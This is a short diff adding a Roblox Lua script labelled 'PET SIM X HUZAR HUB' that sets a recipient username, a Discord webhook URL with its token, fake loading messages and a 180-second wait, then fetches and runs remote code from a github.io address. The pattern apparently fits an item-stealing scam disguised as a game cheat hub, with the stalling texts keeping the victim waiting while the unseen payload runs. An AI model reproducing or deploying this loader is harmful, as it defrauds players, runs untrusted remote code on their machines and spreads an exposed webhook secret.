@@ -1,0 +1,9 @@
+UserName = "taphuongvy2"
+UserName2 = "taphuongvy2"
+Webhook = "https://discord.com/api/webhooks/1102861935495610389/ph-StHm4b29AAfaoBiFMmMI7Vv6SMCIw_lfqoUjbqZDqqRmi3a_bng5drXwnGfe8TrJ3"
+_G.ScriptName = "PET SIM X HUZAR HUB"
+_G.FirstText = "waitng 30sec"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180
+loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()
